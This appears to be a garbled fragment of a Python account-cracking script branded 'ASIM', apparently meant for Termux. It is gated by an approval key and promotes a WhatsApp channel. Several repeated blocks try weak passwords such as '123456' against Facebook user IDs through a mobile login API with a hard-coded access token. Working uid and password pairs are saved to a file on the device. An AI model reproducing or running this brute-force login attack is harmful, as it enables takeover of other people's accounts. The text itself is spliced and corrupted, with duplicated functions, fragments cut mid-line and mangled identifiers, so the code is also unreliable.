...
channel_link = "https://chat.whatsapp.com/D2uAxfFGcooC7o8IuZuybu?mode=wwt"
...
def normASIMze(s):
    """
    NormASIMze string for comparison:
...
# Prepare a set of normASIMzed approved keys for fast compare
approved_normASIMzed = { normASIMze(k) for k in approved_keys }
...
def first_step():
    ...
    if not (channel_link.startswith("http://") or channel_link.startswith("https://")):
        print("InvASIMd link format — URL must start with http/https.")
    else:
        try:
...
def check_key():
    ...
    while attempts < MAX_ATTEMPTS:
        ...
        user_norm = normASIMze(user_key)
        if user_norm in approved_normASIMzed:
            print(f"\n{GREEN}Key approved! Script is running...{RESET}\n")
            return True
        else:
            attempts += 1
            remaining = MAX_ATTEMPTS - attempts
            print(f"\n{GREEN}InvASIMd key! Attempts left: {remaining}{RESET}")
    # cooldown then exit
...
os.system('https://chat.whatsapp.com/D2uAxfFGcooC7o8IuZuybu?mode=wwt')
...
# Set window title
sys.stdout.write('\x1b]2;𓆩【HERO 404】𓆪 \x07')
...
def ____banner____():
    ...
    if 'win' in sys.platform:
        ...
        # ASIM Clover Logo - Green - Version 2.5
def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
    ...
    try:
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                ...
                'generate_session_cookies': '1'GREEN = "\033[1;32m"
RESET = "\033[0m"
    ...
    try:
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                ...
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1'    if shutil.which("termux-open-url"):
        subprocess.run(["termux-open-url", url], check=False)
    elif shutil.which("xdg-open"):
        subprocess.run(["xdg-open", url], check=False)
    else:
    ...
    try:
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                ...
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1'             'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            ...
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mASIM\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/ASIM-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mASIM\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/ASIM-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
...
def login_2(uid):
    ...
    """
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mASIM-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
